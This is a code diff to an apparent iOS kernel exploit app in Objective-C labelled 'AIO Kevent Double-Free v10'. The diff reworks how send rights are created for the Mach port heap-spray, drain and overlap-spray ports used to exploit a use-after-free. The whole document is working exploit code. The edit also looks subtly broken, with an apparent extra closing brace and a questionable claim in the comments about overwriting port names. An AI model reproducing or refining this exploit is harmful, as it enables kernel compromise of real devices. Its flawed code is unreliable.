@@ -3668,10 +3668,13 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     mach_port_t spraySend = MACH_PORT_NULL;
     __block int sprayReady = 0;
     if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &sprayRecv) == KERN_SUCCESS) {
-        mach_msg_type_name_t poly;
-        if (mach_port_extract_right(mach_task_self_, sprayRecv, MACH_MSG_TYPE_MAKE_SEND,
-                                     &spraySend, &poly) == KERN_SUCCESS) {
-            sprayReady = 1;
+        mach_port_t dummy;
+        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &dummy) == KERN_SUCCESS) {
+            if (mach_port_insert_right(mach_task_self_, sprayRecv, dummy,
+                                        MACH_MSG_TYPE_MAKE_SEND) == KERN_SUCCESS) {
+                spraySend = dummy;
+                sprayReady = 1;
+            }
         }
     }
     [self appendLog:[NSString stringWithFormat:@"  Spray port: %@", sprayReady ? @"OK" : @"FAILED"]];
@@ -5678,7 +5681,7 @@ static int _aioUafRunning = 0;
         _aioUafRunning = 1;
     }
 
-    [self appendLog:@"\n========== AIO Kevent Double-Free v9 =========="];
+    [self appendLog:@"\n========== AIO Kevent Double-Free v10 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5864,6 +5867,9 @@ static int _aioUafRunning = 0;
     [self appendLog:@"\n--- Phase D: Magazine drain + OOL overlap ---"];
 
     // Create 8 drain ports + 1 dedicated overlap port. 3 msgs each = fits in qlimit=5.
+    // Strategy: allocate recv port, then allocate a DUMMY port to steal its name
+    // for the send right. This way recv right stays at original name, send right
+    // lives at the dummy's old name. (mach_port_insert_right at SAME name kills recv.)
     enum { kDrainPorts = 8, kDrainMsgsPerPort = 3, kDrainTotal = kDrainPorts * kDrainMsgsPerPort };
     mach_port_t drainRecv[kDrainPorts];
     mach_port_t drainSend[kDrainPorts];
@@ -5872,19 +5878,29 @@ static int _aioUafRunning = 0;
         drainRecv[p] = MACH_PORT_NULL;
         drainSend[p] = MACH_PORT_NULL;
         if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &drainRecv[p]) == KERN_SUCCESS) {
-            mach_msg_type_name_t poly;
-            if (mach_port_extract_right(mach_task_self_, drainRecv[p], MACH_MSG_TYPE_MAKE_SEND,
-                                         &drainSend[p], &poly) == KERN_SUCCESS) {
-                drainPortsReady++;
+            // Allocate a sacrificial port to get a fresh name, then overwrite it
+            // with the send right for drainRecv[p].
+            mach_port_t dummy;
+            if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &dummy) == KERN_SUCCESS) {
+                if (mach_port_insert_right(mach_task_self_, drainRecv[p], dummy,
+                                            MACH_MSG_TYPE_MAKE_SEND) == KERN_SUCCESS) {
+                    drainSend[p] = dummy;
+                    drainPortsReady++;
+                }
             }
         }
     }
-    // Dedicated port for overlap spray — separate recv/send names
+    // Dedicated port for overlap spray — same trick
     mach_port_t overlapRecv = MACH_PORT_NULL, overlapSend = MACH_PORT_NULL;
     if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &overlapRecv) == KERN_SUCCESS) {
-        mach_msg_type_name_t poly;
-        mach_port_extract_right(mach_task_self_, overlapRecv, MACH_MSG_TYPE_MAKE_SEND,
-                                &overlapSend, &poly);
+        mach_port_t dummy;
+        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &dummy) == KERN_SUCCESS) {
+            if (mach_port_insert_right(mach_task_self_, overlapRecv, dummy,
+                                        MACH_MSG_TYPE_MAKE_SEND) == KERN_SUCCESS) {
+                overlapSend = dummy;
+            }
+        }
+    }
     }
     [self appendLog:[NSString stringWithFormat:@"  Drain ports: %d/%d ready", drainPortsReady, kDrainPorts]];
 
